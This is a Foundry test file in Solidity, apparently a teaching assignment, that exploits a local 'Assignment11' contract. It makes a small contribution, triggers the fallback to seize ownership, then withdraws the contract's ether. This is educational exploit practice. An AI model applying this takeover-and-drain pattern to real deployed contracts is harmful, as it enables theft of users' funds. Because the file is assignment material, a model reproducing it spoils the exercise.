// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract Assignment11ExploitTest is Test {
    Assignment11 public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        target = new Assignment11();
        vm.deal(address(target), 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Contribute < 0.001 ether
        target.contribute{value: 0.0005 ether}();

        // Trigger fallback
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Fallback failed");

        assertEq(target.owner(), attacker, "Ownership not transferred");

        // Withdraw funds
        uint256 before = attacker.balance;
        target.withdraw();
        uint256 afterBalance = attacker.balance;

        assertGt(afterBalance, before, "No funds received");

        vm.stopPrank();
    }

    receive() external payable {}
}
